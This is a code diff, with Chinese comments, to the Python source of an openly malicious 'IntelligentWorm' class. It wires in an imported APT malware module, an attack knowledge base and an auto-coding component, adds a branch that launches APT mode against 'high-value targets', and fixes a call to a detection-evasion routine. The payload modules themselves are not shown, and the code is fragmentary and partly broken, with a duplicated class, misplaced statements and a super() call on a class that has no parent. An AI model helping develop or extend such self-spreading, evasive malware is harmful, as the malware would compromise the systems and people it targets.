@@ -37,20 +37,12 @@ from 自动写代码 import AutoCoder
 
 from APT恶意代码 import APTModule
 
-
-class IntelligentWorm:
-    def __init__(self):
-        self.apt = APTModule()  # 初始化APT模块
-
-    def run(self):
-        if self._is_high_value_target():
-            self.apt.apt_main()  # 对高价值目标启用APT模式
-        else:
-            super().run()  # 普通模式
-
 class IntelligentWorm:
     def __init__(self):
         # === 核心配置 ===
+        self.thinker = HumanLikeThinker(knowledge_base=self._load_attack_knowledge())
+        self.coder = AutoCoder()
+        self.apt = APTModule()  # 初始化APT模块
         self.version = "3.0.0"
         self.magic_number = 0xDEADBEEF  # 内存标记
         self.learning_model = None
@@ -87,13 +79,6 @@ class IntelligentWorm:
         self._validate_environment()
         self._log_event("Initialized", "System startup")
 
-        self.thinker = HumanLikeThinker(knowledge_base=self._load_attack_knowledge())
-
-
-self.thinker = HumanLikeThinker(knowledge_base=self._load_attack_knowledge())
-self.coder = AutoCoder()  # 从自动写代码.py导入
-
-
 def _load_attack_knowledge(self):
     """加载攻击相关知识库"""
     return {
@@ -109,6 +94,11 @@ def _load_attack_knowledge(self):
     # === 主运行循环 ===
     def run(self):
         """主执行循环"""
+
+        if self._is_high_value_target():
+            self.apt.apt_main()  # 对高价值目标启用APT模式
+        else:
+            super().run()  # 普通模式
         while self.failed_attempts < self.genome['max_attempts']:
             try:
                 if self._safety_checks():
@@ -388,7 +378,7 @@ def _load_attack_knowledge(self):
         for layer in self.learning_model.values():
             if hasattr(layer, 'weights'):
                 layer.weights = [w * random.uniform(0.9, 1.1) for w in layer.weights]
-                _evade_detection(
+                _evade_detection()
     def update_model(self, new_data):
         """在线更新学习模型"""
         if not self.learning_model:
